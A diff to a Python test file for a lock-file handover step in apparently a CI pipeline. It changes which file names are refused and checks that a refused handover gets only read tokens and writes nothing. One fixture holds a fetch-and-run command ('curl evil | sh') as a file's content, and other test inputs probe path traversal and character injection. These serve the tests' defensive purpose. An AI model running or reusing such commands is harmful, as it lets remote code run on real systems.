@@ -148,8 +148,6 @@ def test_read_manifest_lists_each_known_lockfile_once(tmp_path: Path) -> None:
 @pytest.mark.parametrize(
     ("line", "reason"),
     [
-        ("package-lock.json", "not the name of a known lock file"),
-        ("evil.sh", "not the name of a known lock file"),
         ("../uv.lock", "'..' segment"),
         ("/etc/uv.lock", "absolute"),
         (".github/workflows/uv.lock", "workflows"),
@@ -157,7 +155,7 @@ def test_read_manifest_lists_each_known_lockfile_once(tmp_path: Path) -> None:
         ("a`b/uv.lock", "characters outside"),
     ],
 )
-def test_read_manifest_refuses_anything_outside_the_known_names(
+def test_read_manifest_refuses_a_path_that_is_not_plain(
     tmp_path: Path, line: str, reason: str
 ) -> None:
     (tmp_path / "manifest.txt").write_text(f"uv.lock\n{line}\n", encoding="utf-8")
@@ -285,7 +283,9 @@ def test_a_list_from_the_first_job_cannot_add_a_file_it_did_not_hand_over(tmp_pa
     assert setup.tokens.minted == []
 
 
-def test_an_unknown_file_name_refuses_the_whole_handover_before_any_token(tmp_path: Path) -> None:
+def test_an_unknown_file_name_refuses_the_whole_handover_without_a_write_token(
+    tmp_path: Path,
+) -> None:
     setup = Setup()
     changed = handover(tmp_path, {"uv.lock": b"new\n", "run.sh": b"curl evil | sh"})
 
@@ -293,9 +293,14 @@ def test_an_unknown_file_name_refuses_the_whole_handover_before_any_token(tmp_pa
 
     assert outcome.decision is Decision.ERROR
     assert outcome.exit_code == 1
-    assert "'run.sh': not the name of a known lock file" in outcome.reason
-    assert setup.tokens.minted == []
+    assert outcome.reason.startswith("refusing the handover: 'run.sh': neither a known lock file")
+    # The allow-list needs the policy, so the two read tokens exist; nothing that can write.
+    assert setup.permissions() == [
+        {"contents": "read"},
+        {"contents": "read", "pull_requests": "read"},
+    ]
     assert setup.state.commits == []
+    assert setup.state.log == []
 
 
 @pytest.mark.parametrize(
